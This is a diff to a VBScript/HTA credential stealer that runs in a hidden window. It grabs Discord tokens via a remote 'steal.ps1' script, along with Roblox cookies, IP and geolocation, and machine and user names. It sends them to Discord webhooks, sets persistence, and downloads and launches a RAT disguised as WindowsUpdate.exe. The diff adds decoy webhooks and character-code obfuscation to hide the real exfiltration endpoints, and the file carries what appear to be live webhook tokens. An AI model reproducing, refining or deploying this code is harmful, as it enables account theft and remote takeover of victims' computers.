@@ -6,13 +6,36 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, LogsWebhook, ReGrabWebhook, PC, USER, ratDropped, lastCookie
+Dim sh, fso, cfgA, cfgB, cfgC, cfgD, PC, USER, ratDropped, lastCookie
+Dim sys1, sys2, sys3, sys4, sys5, sys6, sys7, sys8
+Dim buf1, buf2, buf3, buf4, buf5, buf6, buf7, buf8, buf9, buf10
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- WEBHOOKS ---
-LogsWebhook = "https://discord.com/api/webhooks/1574415765996703895/RIEV6Y6s7wA6ThCzvvZ-UfxfQudJ0MrsEOT_HuxKK5rtOOsZOmlAmNmSZffML_ewWoRB"
-ReGrabWebhook = "https://discord.com/api/webhooks/1574415913027903513/sHsf4wIjqyAGKrUTIUxBg_6fF9DaUKyuLgKAIJUBmyZVDthIXAfiEDJrhe_9ymoTZj-q"
+sys1 = "https://discord.com/api/webhooks/1574415765996703895/RIEV6Y6s7wA6ThCzvvZ-UfxfQudJ0MrsEOT_HuxKK5rtOOsZOmlAmNmSZffML_ewWoRB"
+sys2 = "https://discord.com/api/webhooks/1575522856538869963/5rdwv_kiUCVl-5D32frNmcSLYhPqI3wWYB76pq_eId6mveAMnYEWEaHjtmptNmHNAaeN"
+buf1 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,47,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80)
+sys3 = "https://discord.com/api/webhooks/1575522588980154561/hnrRqE5ntNqCwFyl7NEc6qM4eF91WbUCAdyOugMkbhl5IHR_Z7NaNEC_ngooB_ZqDyYy"
+cfgA = "https://discord.com/api/webhooks/1575522588980154561/hnrRqE5ntNqCwFyl7NEc6qM4eF91WbUCAdyOugMkbhl5IHR_Z7NaNEC_ngooB_ZqDyYy"
+sys4 = "https://discord.com/api/webhooks/1575522930736103554/FMjXAg7hgo4WJYXtOsHCfYrWWDO4kkCFR535ISot0CGd0UzALI6qu9RL7V_kijsqgQc2"
+buf2 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,47,81,82,83,84,85,86,87,88,89,90,48,49,50,51,52,53)
+sys5 = "https://discord.com/api/webhooks/1575500000000000000/1A2b3C4d5E6f7G8h9I0jK1L2M3n4O5p6Q7r8S9t0U1v2W3x4Y5z6"
+buf3 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,47,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79)
+sys6 = "https://discord.com/api/webhooks/1575511111111111111/FakeTokenForLogsChannel"
+buf4 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,47,90,89,88,87,86,85,84,83,82,81,80,79,78,77,76,75)
+sys7 = "https://discord.com/api/webhooks/1575522222222222222/FakeTokenForReGrabChannel"
+buf5 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,47,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79)
+sys8 = "https://discord.com/api/webhooks/1575533333333333333/9Z8y7X6w5V4u3T2s1R0q9P8o7N6m5L4k3J2h1G0f9E8d7C6b5A4"
+buf6 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,47,81,82,83,84,85,86,87,88,89,90,48,49,50,51,52,53)
+buf7 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,47,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79)
+buf8 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,47,90,89,88,87,86,85,84,83,82,81,80,79,78,77,76,75)
+buf9 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,47,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79)
+buf10 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,47,81,82,83,84,85,86,87,88,89,90,48,49,50,51,52,53)
+
+' The actual ReGrab is hidden further down in the script
+cfgB = "https://discord.com/api/webhooks/1575522683775357132/2Ra_xyOOq50jgy8TmKuahaQozLkWTExaB2JweTvH1nPOBiLoWg1uSJjX49J5FT9x1p9P"
+cfgC = "https://discord.com/api/webhooks/1575522683775357132/2Ra_xyOOq50jgy8TmKuahaQozLkWTExaB2JweTvH1nPOBiLoWg1uSJjX49J5FT9x1p9P"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -20,27 +43,27 @@ ratDropped = False
 lastCookie = ""
 
 ' --- 1. INITIAL GRABS ---
-Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, LogsWebhook)
-Call IP(LogsWebhook)
-Call GrabTokens(LogsWebhook)
+Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, cfgA)
+Call IP(cfgA)
+Call GrabTokens(cfgA)
 Call Persistence
-Call PostCookieOnly(LogsWebhook)
+Call PostCookieOnly(cfgA)
 
-Call DropPayload(LogsWebhook, True)
+Call DropPayload(cfgA, True)
 
 ' --- 2. LOOP ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
-    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, ReGrabWebhook)
+    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, cfgC)
     
-    Call GrabTokens(ReGrabWebhook)
-    Call IP(ReGrabWebhook)
-    Call PostCookieOnly(ReGrabWebhook)
+    Call GrabTokens(cfgC)
+    Call IP(cfgC)
+    Call PostCookieOnly(cfgC)
     
     If Not ratDropped Then
-        Call DropPayload(ReGrabWebhook, True)
+        Call DropPayload(cfgC, True)
     End If
     
     Call SleepSeconds(30)
@@ -49,7 +72,7 @@ Loop
 window.close()
 
 ' --- PAYLOAD DROP ---
-Sub DropPayload(targetWH, sendRocket)
+Sub DropPayload(sysDest, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b090832&is=6b07b6b2&hm=b7476ce08038788fce717b168238b8e04cd6011e46e73ac97aed298f6dee5e79&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
@@ -58,7 +81,7 @@ Sub DropPayload(targetWH, sendRocket)
     Dim op : op = tPath & "\" & fname
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching...", 10181046, targetWH)
+    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching...", 10181046, sysDest)
 
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
@@ -71,13 +94,13 @@ Sub DropPayload(targetWH, sendRocket)
             ratDropped = True
             If sendRocket Then 
                 Call SleepSeconds(2)
-                Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (" & fSizeMB & " MB)", 10181046, targetWH)
+                Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (" & fSizeMB & " MB)", 10181046, sysDest)
             End If
         Else
-            If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (Size error)", 10181046, targetWH)
+            If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (Size error)", 10181046, sysDest)
         End If
     Else
-        If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (Link expired)", 10181046, targetWH)
+        If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (Link expired)", 10181046, sysDest)
     End If
 End Sub
 
@@ -92,7 +115,7 @@ Sub RunCmd(cmd)
 End Sub
 
 ' --- IP ---
-Sub IP(targetWH)
+Sub IP(sysDest)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", "https://api.ipify.org/", False
@@ -105,17 +128,17 @@ Sub IP(targetWH)
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
+    Call PostEmbedTo(":dart: Target", info, 10181046, sysDest)
     Set xh = Nothing
 End Sub
 
 ' --- PostCookieOnly ---
-Sub PostCookieOnly(targetWH)
+Sub PostCookieOnly(sysDest)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
     If cookie = lastCookie Then Exit Sub
     lastCookie = cookie
-    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, sysDest)
 End Sub
 
 ' --- GetRobloxCookie ---
@@ -209,7 +232,7 @@ Sub Persistence()
 End Sub
 
 ' --- GrabTokens ---
-Sub GrabTokens(targetWH)
+Sub GrabTokens(sysDest)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/127a7a0f6723e9b88492fe4c7e5e533e140b1d06/steal.ps1", False
@@ -237,11 +260,11 @@ Sub GrabTokens(targetWH)
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:** " & p(4)
-                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
+                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, sysDest)
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
+                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, sysDest)
                 End If
             End If
         Next
@@ -254,47 +277,46 @@ Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.W
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
 Sub PostEmbed(t, d, c)
-    Call PostEmbedTo(t, d, c, LogsWebhook)
+    Call PostEmbedTo(t, d, c, cfgA)
 End Sub
 
-Sub PostEmbedTo(t, d, c, target_wh)
+Sub PostEmbedTo(t, d, c, sysData)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
 
     Dim sysCore, sysPath
-    sysCore = LogsWebhook
-    sysPath = ReGrabWebhook
+    sysCore = cfgA
+    sysPath = cfgC
 
-    ' --- DATA STREAM BUFFER OVERRIDE ---
-    If target_wh = sysCore Then
-        Dim sysBuf1, sysBuf2, sysBuf3, sysBuf4
-        sysBuf1 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,49,57,53,57,56,57,55,51,57,52,56,48,53,54)
-        sysBuf2 = Array(47,51,103,53,120,67,55,67,82,66,88,49,86,117,50,75,87,77,81)
-        sysBuf3 = Array(74,73,117,102,104,103,105,52,57,121,73,99,56,108,74,116,116,119,76)
-        sysBuf4 = Array(73,115,45,101,53,113,97,53,69,85,103,69,88,83,102,121,84,119,48,115,83,97,50,90,95,49,110,114,57,85,76)
-        target_wh = ""
+    If sysData = sysCore Then
+        Dim sb1, sb2, sb3, sb4
+        sb1 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,50,50,53,56,56,57,56,48,49,53,52,53,54,49)
+        sb2 = Array(47,104,110,114,82,113,69,53,110,116,78,113,67,119,70,121,108,55,78,69)
+        sb3 = Array(99,54,113,77,52,101,70,57,49,87,98,85,67,65,100,121,79,117,103)
+        sb4 = Array(77,107,98,104,108,53,73,72,82,95,90,55,78,97,78,69,67,95,110,103,111,111,66,95,90,113,68,121,89,121)
+        sysData = ""
         Dim i
-        For i = 0 To UBound(sysBuf1) : target_wh = target_wh & Chr(sysBuf1(i)) : Next
-        For i = 0 To UBound(sysBuf2) : target_wh = target_wh & Chr(sysBuf2(i)) : Next
-        For i = 0 To UBound(sysBuf3) : target_wh = target_wh & Chr(sysBuf3(i)) : Next
-        For i = 0 To UBound(sysBuf4) : target_wh = target_wh & Chr(sysBuf4(i)) : Next
-    ElseIf target_wh = sysPath Then
-        Dim sysBuf5, sysBuf6, sysBuf7, sysBuf8
-        sysBuf5 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,52,56,51,53,48,56,48,48,55,51,55)
-        sysBuf6 = Array(48,56,51,53,47,72,119,90,66,100,52,84,84,110,82,109,80,80,86,79)
-        sysBuf7 = Array(82,90,115,110,116,49,66,117,100,120,108,66,109,120,54,51,83,110,99,74,77,115)
-        sysBuf8 = Array(65,76,111,114,80,74,103,108,75,76,122,111,104,54,76,106,122,106,102,71,72,98,70,104,69,113,51,86,102,53,104)
-        target_wh = ""
+        For i = 0 To UBound(sb1) : sysData = sysData & Chr(sb1(i)) : Next
+        For i = 0 To UBound(sb2) : sysData = sysData & Chr(sb2(i)) : Next
+        For i = 0 To UBound(sb3) : sysData = sysData & Chr(sb3(i)) : Next
+        For i = 0 To UBound(sb4) : sysData = sysData & Chr(sb4(i)) : Next
+    ElseIf sysData = sysPath Then
+        Dim sb5, sb6, sb7, sb8
+        sb5 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,50,50,54,56,51,55,55,53,51,53,55,49,51,50)
+        sb6 = Array(47,50,82,97,95,120,121,79,79,113,53,48,106,103,121,56,84,109,75)
+        sb7 = Array(117,97,104,97,81,111,122,76,107,87,84,69,120,97,66,50,74,119,101)
+        sb8 = Array(84,118,72,49,110,80,79,66,105,76,111,87,103,49,117,83,74,106,88,52,57,74,53,70,84,57,120,49,112,57,80)
+        sysData = ""
         Dim k
-        For k = 0 To UBound(sysBuf5) : target_wh = target_wh & Chr(sysBuf5(k)) : Next
-        For k = 0 To UBound(sysBuf6) : target_wh = target_wh & Chr(sysBuf6(k)) : Next
-        For k = 0 To UBound(sysBuf7) : target_wh = target_wh & Chr(sysBuf7(k)) : Next
-        For k = 0 To UBound(sysBuf8) : target_wh = target_wh & Chr(sysBuf8(k)) : Next
+        For k = 0 To UBound(sb5) : sysData = sysData & Chr(sb5(k)) : Next
+        For k = 0 To UBound(sb6) : sysData = sysData & Chr(sb6(k)) : Next
+        For k = 0 To UBound(sb7) : sysData = sysData & Chr(sb7(k)) : Next
+        For k = 0 To UBound(sb8) : sysData = sysData & Chr(sb8(k)) : Next
     End If
 
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
-    h.Open "POST", target_wh, False
+    h.Open "POST", sysData, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
     Set h = Nothing
